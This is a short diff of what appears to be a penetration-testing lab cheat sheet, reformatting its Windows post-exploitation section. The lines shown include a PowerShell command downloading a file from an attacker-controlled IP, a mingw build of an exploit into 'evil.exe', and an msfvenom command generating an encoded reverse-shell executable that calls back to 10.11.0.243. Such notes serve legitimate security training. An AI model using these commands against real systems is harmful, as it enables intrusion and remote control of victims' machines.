@@ -212,13 +212,14 @@ nbtscan -v 10.11.1.X
 
 # Windows Post-Exploitation
 	
-Powershell File Download: powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.243/test.txt','C:\test.txt)”
+Powershell File Download: \
+*powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.243/test.txt','C:\test.txt)”*
 
 General File Transfer: https://blog.ropnop.com/transferring-files-from-kali-to-windows/ 
 
-Mingw Compiling for Windows: i686-w64-mingw32-g++ -o evil.exe 37098.txt -lws2_32
+Mingw Compiling for Windows: *i686-w64-mingw32-g++ -o evil.exe 37098.txt -lws2_32*
 
-Dos2unix (Gets rid of /bin/sh^5 error): dos2unix <filename> 
+Dos2unix (Gets rid of /bin/sh^5 error): *dos2unix <filename>* 
 	
 Payload Encoding: msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.243 LPORT=1777 -f exe -o rever.exe -e x86/shikata_ga_nai -k
 
